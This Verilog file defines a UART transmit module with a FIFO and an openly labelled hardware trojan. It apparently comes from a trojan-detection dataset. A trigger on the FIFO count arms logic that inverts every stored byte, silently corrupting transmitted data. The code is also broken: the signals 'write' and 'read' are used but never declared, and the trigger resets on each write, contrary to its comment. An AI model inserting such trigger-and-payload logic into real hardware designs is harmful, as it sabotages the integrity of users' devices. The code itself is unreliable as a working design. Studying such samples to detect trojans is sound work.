 // Enhanced UART TX Module with FIFO and Hardware Trojan Variation
module uart_tx_fifo_trojan_v3 (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    // Memory for UART data and control signals
    reg [7:0] mem [0:31];
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0;
    reg [4:0] cnt = 5'd0;
    reg we = 1'b0;
    reg [7:0] data = 8'd0;

    // UART transmission control
    wire uart_busy;
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(data),
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Trojan activation condition: FIFO count reaches a specific value.
    reg trojan_active = 1'b0;
    always @(posedge clk) begin
        if (cnt == 5'd16) trojan_active <= 1'b1; // Trojan activates when FIFO is half full
        if (rx_we) begin // Reset the trojan activation when new data is written
            trojan_active <= 1'b0;
        end
    end

    // Data manipulation by the hardware trojan
    always @(posedge clk) begin
        if (write & ~read) begin
            cnt <= cnt + 5'd1;
            mem[w_addr] <= rx_data ^ (trojan_active ? 8'hFF : 8'h00); // Invert data if trojan is active
            w_addr <= w_addr + 5'd1;
        end
        if (read & ~write) begin
            cnt <= cnt - 5'd1;
            r_addr <= r_addr + 5'd1;
            we <= 1'b1;
            data <= mem[r_addr]; // Send out data without further manipulation
        end else begin
            we <= 1'b0;
        end
    end

    // Update the busy signal
    always @(posedge clk) begin
        tx_busy <= uart_busy | (cnt != 5'd0);
    end

endmodule
